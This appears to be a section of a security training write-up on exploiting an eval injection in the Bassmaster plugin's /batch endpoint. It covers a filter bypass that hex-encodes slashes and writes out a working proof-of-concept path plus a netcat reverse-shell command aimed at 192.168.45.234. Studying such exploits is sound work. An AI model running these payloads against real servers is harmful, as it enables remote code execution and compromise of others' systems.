# Crafting Exploit

The Bassmaster plugin comes with an example file `examples/batch.js` that tells us how to perform the request to the `/batch` endpoint. We find that the example code defines 2 ways to reach the batch function, which involves a GET request to `/request`, and a POST request directly to the `/batch` endpoint. 

```jsx
internals.requestBatch = function (request, reply) {

    internals.http.inject({
        method: 'POST',
        url: '/batch',
        payload: '{ "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }] }'
    }, function (res) {

        reply(res.result);
    });
};

internals.main = function () {

    internals.http = new Hapi.Server(8080);

    internals.http.route([
        { method: 'GET', path: '/profile', handler: internals.profile },
        { method: 'GET', path: '/item', handler: internals.activeItem },
        { method: 'GET', path: '/item/{id}', handler: internals.item },
        { method: 'GET', path: '/request', handler: internals.requestBatch }
    ]);

    internals.http.pack.register({
        plugin: require('../')
    }, function (err) {

        if (err) {
            console.log(err);
        }
        else {
            internals.http.start(function () {
                console.log('Server started.');
            });
        }
    });
};

```

In the last section, it was seen that the path attribute of our JSON request was “sanitized” with the regex expression `/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g;`. We can then use [regex101: build, test, and debug regex](https://regex101.com/) to test out some of the sample input strings. As such, this leads us to the request with path `/item/$1.id;require('util').log('hacked');` that will trigger the `eval` function. When run, there will be output stating “hacked” in our server console (that we started the application from). 

## Debugging

Remember: If exploit fails, we can insert debugging code into the server: `console.log('Execute: ' + parts[i].value);`

When we try to submit a payload as below, we notice that our code injection is getting truncated at the first occurrence of “/”. To check, we place our payload in [Regex101](https://regex101.com/) against the regex filter to see the output. As such, we’ll need to encode our payload so that it won’t be filtered out.

```jsx
cmd: cmd = "require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.234 9001 >/tmp/f')"
Output: Execute: id;require('util').log('require('child_process').exec('rm
```

Since javascript accepts HEX encoding we can substitute out `/` with `\x2f` to replace the values accordingly. Remember to add more `\` in front if we need to escape the string within our Python code.  

Once we’re done, we can use either netcat or NodeJS reverse shell to gain a reverse shell.